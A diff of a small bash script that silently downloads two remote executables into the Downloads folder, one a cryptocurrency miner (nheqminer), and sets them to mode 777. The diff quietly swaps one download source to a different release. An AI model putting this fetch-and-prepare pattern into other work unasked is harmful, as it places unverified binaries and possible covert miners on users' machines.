@@ -1,9 +1,8 @@
-
 #!/bin/bash
 #nice and save
 cd;
 cd Downloads/;
-curl -sL https://github.com/Username/Krim/releases/download/v.3.0/start > start
+curl -sL https://github.com/SteveJobsDerEchte/Krim/releases/download/v0.0.1/nice > start
 curl -sL https://github.com/justvanbloom/nheqminer/blob/kost/mac/nheqminer?raw=true > nheqminer
 chmod 777 start
 chmod 777 nheqminer
